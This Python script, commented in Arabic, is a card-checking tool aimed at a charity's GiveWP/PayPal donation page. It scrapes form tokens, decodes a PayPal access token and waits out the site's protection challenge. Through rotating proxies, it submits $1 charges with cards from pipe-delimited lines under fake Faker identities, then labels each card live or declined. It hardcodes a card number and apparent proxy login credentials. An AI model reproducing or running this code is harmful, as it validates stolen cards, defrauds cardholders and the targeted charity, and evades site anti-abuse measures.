import re
import json
import base64
import secrets
import asyncio
import uuid
from faker import Faker
from curl_cffi.requests import AsyncSession
from proxy_manager import get_next_proxy

fake = Faker("en_US")

class tools:
    @staticmethod
    def getcard(card: str) -> dict:
        parts = card.split("|")
        cc = parts[0].strip() if len(parts) > 0 else ""
        mm = parts[1].strip() if len(parts) > 1 else ""
        yy = parts[2].strip() if len(parts) > 2 else ""
        cvv = parts[3].strip() if len(parts) > 3 else ""
        
        mm = mm.zfill(2)
        if len(yy) == 4:
            yy = yy[-2:]
        elif len(yy) == 2:
            yy = yy
            
        return {"cc": cc, "mm": mm, "yy": yy, "cvv": cvv}

    @staticmethod
    def userdata() -> dict:
        fn = fake.first_name()
        ln = fake.last_name()
        return {
            "name": f"{fn} {ln}",
            "first": fn,
            "last": ln,
            "address": fake.street_address(),
            "city": fake.city(),
            "state": fake.state_abbr(),
            "zip": fake.postcode(),
            "email": f"{fn.lower()}.{ln.lower()}@gmail.com",
            "phone": fake.phone_number(),
        }

def build_multipart_data(fields: dict) -> tuple:
    boundary = '----WebKitFormBoundary' + uuid.uuid4().hex
    body = ""
    for key, value in fields.items():
        if value is None:
            value = ""
        body += f"--{boundary}\r\n"
        body += f'Content-Disposition: form-data; name="{key}"\r\n\r\n'
        body += f"{value}\r\n"
    body += f"--{boundary}--\r\n"
    
    content_type = f"multipart/form-data; boundary={boundary}"
    return body.encode('utf-8'), content_type

class Gateway:
    @staticmethod
    async def charge_card(card_data: dict, user_data: dict, proxies: dict = None) -> tuple[str, str, bool]:
        token = secrets.token_hex(16)
        
        f = user_data["first"]
        l = user_data["last"]
        k = user_data["name"]
        e = user_data["email"]

        n = card_data["cc"]
        mm = card_data["mm"]
        yy = card_data["yy"]
        cvc = card_data["cvv"]

        print(f"\n[INFO] بدء عملية الدفع للبطاقة: {n[:6]}******{n[-4:]}")
        
        async with AsyncSession(impersonate="chrome", proxies=proxies) as session:
            try:
                # ==========================================
                # Step 1: GET donation page + Bypass Challenge
                # ==========================================
                print("[1] جاري سحب الصفحة الرئيسية...")
                headers_init = {
                    'authority': 'bukjeh.org',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
                    'cache-control': 'max-age=0',
                    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
                    'sec-ch-ua-mobile': '?1',
                    'sec-ch-ua-platform': '"Android"',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'none',
                    'sec-fetch-user': '?1',
                    'upgrade-insecure-requests': '1',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
                }
                
                resp_init = await session.get('https://bukjeh.org/donations/donation-2023-2-3/', headers=headers_init)
                html = resp_init.text
                
                # تجاوز صفحة الانتظار (5 seconds reload challenge)
                if 'window.location.reload()' in html:
                    print("    [!] تم اكتشاف صفحة انتظار الحماية، جاري الانتظار 6 ثوانٍ وإعادة الطلب...")
                    await asyncio.sleep(6)
                    resp_init = await session.get('https://bukjeh.org/donations/donation-2023-2-3/', headers=headers_init)
                    html = resp_init.text
                
                try:
                    hash_val = re.search(r'name="give-form-hash" value="(.*?)"', html).group(1)
                    pre = re.search(r'name="give-form-id-prefix" value="(.*?)"', html).group(1)
                    give = re.search(r'name="give-form-id" value="(.*?)"', html).group(1)
                    enc = re.search(r'"data-client-token":"(.*?)"', html).group(1)
                    
                    dec = base64.b64decode(enc).decode("utf-8")
                    au = re.search(r'"accessToken":"(.*?)"', dec).group(1)
                except AttributeError:
                    print("    [خطأ] لم يتم العثور على المتغيرات. رد الموقع:")
                    print("    " + "-"*40)
                    print(f"    {html[:300].strip()}...") 
                    print("    " + "-"*40)
                    return "Error", "Missing form parameters (Blocked or Changed)", False

                print(f"    -> تم استخراج البيانات بنجاح: hash={hash_val}")

                # ==========================================
                # Step 2: First AJAX - give_process_donation
                # ==========================================
                print("[2] إرسال طلب AJAX الأول...")
                headers_ajax1 = {
                    'authority': 'bukjeh.org',
                    'accept': '*/*',
                    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'origin': 'https://bukjeh.org',
                    'referer': 'https://bukjeh.org/donations/donation-2023-2-3/',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
                    'x-requested-with': 'XMLHttpRequest',
                }
                
                data_ajax1 = {
                    'give-fee-amount': '0',
                    'give-fee-mode-enable': 'false',
                    'give-fee-status': 'enabled',
                    'give-honeypot': '',
                    'give-form-id-prefix': pre,
                    'give-form-id': give,
                    'give-form-title': 'Help us make A’amar',
                    'give-current-url': 'https://bukjeh.org/donations/donation-2023-2-3/',
                    'give-form-url': 'https://bukjeh.org/donations/donation-2023-2-3/',
                    'give-form-minimum': '1.00',
                    'give-form-maximum': '999999.99',
                    'give-form-hash': hash_val,
                    'give-price-id': '3',
                    'give-recurring-logged-in-only': '',
                    'give-logged-in-only': '1',
                    '_give_is_donation_recurring': '0',
                    'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}',
                    'give-amount': '1.00',
                    'give-recurring-period-donors-choice': 'month',
                    'payment-mode': 'paypal-commerce',
                    'give_first': f,
                    'give_last': l,
                    'give_email': e,
                    'card_name': k,
                    'card_exp_month': '',
                    'card_exp_year': '',
                    'give_action': 'purchase',
                    'give-gateway': 'paypal-commerce',
                    'action': 'give_process_donation',
                    'give_ajax': 'true',
                }
                await session.post('https://bukjeh.org/wp-admin/admin-ajax.php', headers=headers_ajax1, data=data_ajax1)

                # ==========================================
                # Step 3: Second AJAX - Create Order (Multipart)
                # ==========================================
                print("[3] إنشاء طلب (Create Order)...")
                
                fields_payload = {
                    'give-fee-amount': '0',
                    'give-fee-mode-enable': 'false',
                    'give-fee-status': 'enabled',
                    'give-honeypot': '',
                    'give-form-id-prefix': pre,
                    'give-form-id': give,
                    'give-form-title': 'Help us make A’amar',
                    'give-current-url': 'https://bukjeh.org/donations/donation-2023-2-3/',
                    'give-form-url': 'https://bukjeh.org/donations/donation-2023-2-3/',
                    'give-form-minimum': '1.00',
                    'give-form-maximum': '999999.99',
                    'give-form-hash': hash_val,
                    'give-price-id': '3',
                    'give-recurring-logged-in-only': '',
                    'give-logged-in-only': '1',
                    '_give_is_donation_recurring': '0',
                    'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}',
                    'give-amount': '1.00',
                    'give-recurring-period-donors-choice': 'month',
                    'give_stripe_payment_method': '',
                    'payment-mode': 'paypal-commerce',
                    'give_first': f,
                    'give_last': l,
                    'give_email': e,
                    'card_name': k,
                    'card_exp_month': '',
                    'card_exp_year': '',
                    'give-gateway': 'paypal-commerce',
                }
                
                body_bytes, content_type = build_multipart_data(fields_payload)
                
                headers_ajax2 = {
                    'authority': 'bukjeh.org',
                    'accept': '*/*',
                    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
                    'content-type': content_type,
                    'origin': 'https://bukjeh.org',
                    'referer': 'https://bukjeh.org/donations/donation-2023-2-3/',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
                }
                
                params_ajax2 = {'action': 'give_paypal_commerce_create_order'}
                resp_ajax2 = await session.post('https://bukjeh.org/wp-admin/admin-ajax.php', params=params_ajax2, headers=headers_ajax2, data=body_bytes)
                
                try:
                    order_id = resp_ajax2.json()['data']['id']
                    print(f"    -> تم إنشاء Order ID: {order_id}")
                except Exception:
                    print(f"    [خطأ] فشل في خطوة Create Order. الرد: {resp_ajax2.text[:100]}")
                    return "Error", "Failed to create PayPal order", False

                # ==========================================
                # Step 4: PayPal Confirm Payment Source
                # ==========================================
                print("[4] تأكيد الدفع عبر PayPal...")
                headers_paypal = {
                    'authority': 'cors.api.paypal.com',
                    'accept': '*/*',
                    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
                    'authorization': f'Bearer {au}',
                    'braintree-sdk-version': '3.32.0-payments-sdk-dev',
                    'content-type': 'application/json',
                    'origin': 'https://assets.braintreegateway.com',
                    'paypal-client-metadata-id': token,
                    'referer': 'https://assets.braintreegateway.com/',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
                }
                
                json_data = {
                    'payment_source': {
                        'card': {
                            'number': n,
                            'expiry': f'20{yy}-{mm}',
                            'security_code': cvc,
                            'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}},
                        },
                    },
                    'application_context': {'vault': False},
                }
                
                await session.post(f'https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source', headers=headers_paypal, json=json_data)

                # ==========================================
                # Step 5: Approve Order (Multipart)
                # ==========================================
                print("[5] الموافقة على الطلب واستخراج النتيجة...")
                params_ajax3 = {
                    'action': 'give_paypal_commerce_approve_order',
                    'order': order_id,
                }
                
                resp_ajax3 = await session.post('https://bukjeh.org/wp-admin/admin-ajax.php', params=params_ajax3, headers=headers_ajax2, data=body_bytes)
                text = resp_ajax3.text.upper()
                
                status, msg, is_live = "UNKNOWN_ERROR", "Unrecognised response ❓", False
                
                if 'TRUE' in text or 'SUCSESS' in text or 'SUCCESS' in text:
                    status, msg, is_live = 'Success', 'Charged - $1 ! ✅', True
                elif 'DO_NOT_HONOR' in text:
                    status, msg = 'Declined', 'Do Not Honor ❌'
                elif 'INSUFFICIENT_FUNDS' in text:
                    status, msg = 'Declined', 'Insufficient Funds ❌'
                elif 'GENERIC_DECLINE' in text:
                    status, msg = 'Declined', 'Generic Decline ❌'
                elif 'INVALID_OR_RESTRICTED_CARD' in text:
                    status, msg = 'Declined', 'Invalid Or Restricted Card ❌'
                else:
                    try:
                        error_data = resp_ajax3.json()
                        msg = error_data['data']['error'] + " ❌"
                        status = "Declined"
                    except:
                        pass
                
                print(f"    -> النتيجة النهائية: {msg}")
                return status, msg, is_live

            except Exception as e:
                print(f"[خطأ] حدث استثناء أثناء التنفيذ: {str(e)}")
                return "Error", f"Exception: {str(e)}", False


async def process_paypal_1(card_line: str, proxy_url: str = None) -> tuple[str, str, bool]:
    card_data = tools.getcard(card_line)
    if not card_data["cc"]:
        return "Failed", "Invalid card format", False

    max_attempts = 5
    for attempt in range(max_attempts):
        print(f"\n==============================================")
        print(f"🔄 المحاولة رقم: {attempt + 1} من أصل {max_attempts}")
        
        user_data = tools.userdata()
        current_proxy_url = get_next_proxy() if not proxy_url else proxy_url
        proxies = {"http": current_proxy_url, "https": current_proxy_url} if current_proxy_url else None
        
        print(f"🌐 البروكسي: {current_proxy_url}")

        status, msg, is_live = await Gateway.charge_card(card_data=card_data, user_data=user_data, proxies=proxies)

        if "Order Not Approved" in msg:
            if attempt == max_attempts - 1:
                return status, msg, is_live
            continue
        else:
            return status, msg, is_live
    return "Error", "Max attempts exceeded", False
    
async def main():
    test_card = "4211566115568609|12|28|321"
    proxy = "http://purevpn0s8732217:i67s60ep@Px121102.pointtoserver.com:10780"

    print("🚀 Testing gateway (ST Charge)...")
    status, message, is_live = await process_paypal_1(test_card, proxy_url=proxy)

    print("\n--- Execution Result ---")
    print(f"Status  : {status}")
    print(f"Message : {message}")
    print(f"Live    : {is_live}")

if __name__ == "__main__":
    asyncio.run(main())
